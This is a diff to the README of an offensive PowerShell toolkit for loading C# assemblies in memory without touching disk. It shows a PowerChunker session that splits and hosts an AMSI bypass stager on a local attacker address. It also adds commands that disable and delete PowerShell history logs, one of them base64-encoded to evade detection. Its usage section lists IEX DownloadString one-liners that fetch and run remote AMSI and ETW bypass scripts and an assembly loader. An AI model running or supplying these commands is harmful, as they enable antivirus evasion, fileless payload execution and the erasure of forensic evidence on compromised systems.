@@ -7,7 +7,52 @@ https://github.com/S3cur3Th1sSh1t/PowerSharpPack
 ## However, sometimes I will need to load some uncommon CSharp tools, this one is used to load CSharp assembly EXE directly in memory (fileless). it will provide a better AV bypass (need AMSI bypass first)
 
 ## Regarding to AMSI bypass, must read this first:
-https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/ 
+https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/
+
+## To bring back a detected AMSI bypass script alive:
+https://github.com/icyguider/PowerChunker
+
+Run the following command to generate amsibypass stager and host it:
+```
+┌──(root💀TW-PenTestBox)-[/opt/PowerChunker]
+└─# ./PowerChunker.py bypass.ps1 10.0.0.186 --serve
+
+/\     __    PowerChunker.py!!!            
+  \ .-':::.         (by @icyguider)                       
+   \ :::::|\                              
+  |,\:::'/  \     why is there hamburger? 
+  `.:::-'    \                             
+    `-.       \         ___                
+       `-.     |     .-'';:::.              
+          `-.-'     / ',''.;;;\            
+                   |  ','','.''|            
+              AsH  |\  ' ,',' /'           
+                   `.`-.___.-;'             
+                     `--._.-'                                                           
+
+[+] Powershell script has been split into 10 files...
+[!] PowerChunker Stager written to: chunker.ps1
+    Execute like so: iex (iwr -UseBasicParsing http://10.0.0.186/chunker.ps1)
+
+┌──(root💀TW-PenTestBox)-[/opt/PowerChunker]
+└─# python3 -m http.server 80
+```
+
+## To block writes history log
+```
+# Neuter Writes to History Log:
+Set-PSReadlineOption -HistorySaveStyle SaveNothing
+
+# Encoded version of blocking writes to history
+[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UwBlAHQALQBQAFMAUgBlAGEAZABsAGkAbgBlAE8AcAB0AGkAbwBuACAALQBIAGkAcwB0AG8AcgB5AFMAYQB2AGUAUwB0AHkAbABlACAAUwBhAHYAZQBOAG8AdABoAGkAbgBnAA==')) | IEX
+
+# Delete history logs
+rm (Get-PSReadlineOption).HistorySavePath
+```
+
+Ref:
+[1] https://gist.github.com/reigningshells/a255fcca07465befbcbf4be9cdf67560
+
 
 ### Usage:
 
@@ -18,7 +63,7 @@ IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l
 IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssembly.ps1"));
 
 ## If amsi3.txt has been blocked, then try the following AMSI bypass 
-IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi.txt"));
+IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi1_1.txt"));
 IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi2.txt"));
 IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/etw.txt"));
 IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssembly.ps1"));
